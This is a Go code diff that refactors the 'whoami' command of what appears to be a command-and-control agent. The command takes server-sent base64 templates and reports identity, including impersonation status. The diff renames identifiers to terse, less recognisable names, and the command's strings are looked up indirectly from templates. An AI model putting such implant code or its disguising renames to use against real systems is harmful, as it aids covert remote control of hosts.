@@ -16,8 +16,8 @@ import (
 	"time"
 )
 
-// WhoamiTemplate matches the server's CommandTemplate structure
-type WhoamiTemplate struct {
+// IdentCfg matches the server's CommandTemplate structure
+type IdentCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -63,14 +63,14 @@ func waFlagG() string     { return waTpl(idxWaFlagG) }
 func waBackslash() string { return waTpl(idxWaBackslash) }
 
 type WhoamiCommand struct {
-	tpl *WhoamiTemplate
+	tpl *IdentCfg
 }
 
-func (c *WhoamiCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data if available
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
-			c.tpl = &WhoamiTemplate{}
+func (c *WhoamiCommand) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data if available
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data); err == nil {
+			c.tpl = &IdentCfg{}
 			if err := json.Unmarshal(decoded, c.tpl); err == nil && c.tpl.Templates != nil {
 				SetWhoamiTemplate(c.tpl.Templates)
 			}
@@ -87,10 +87,10 @@ func (c *WhoamiCommand) Execute(ctx *CommandContext, args []string) CommandResul
 			if len(args) > 0 && args[0] == waFlagV() {
 				output.WriteString("|" + WImpersn)
 			}
-			return CommandResult{
+			return OpResult{
 				Output:      output.String(),
-				ExitCode:    0,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    0,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 	}
@@ -142,10 +142,10 @@ func (c *WhoamiCommand) Execute(ctx *CommandContext, args []string) CommandResul
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      output.String(),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
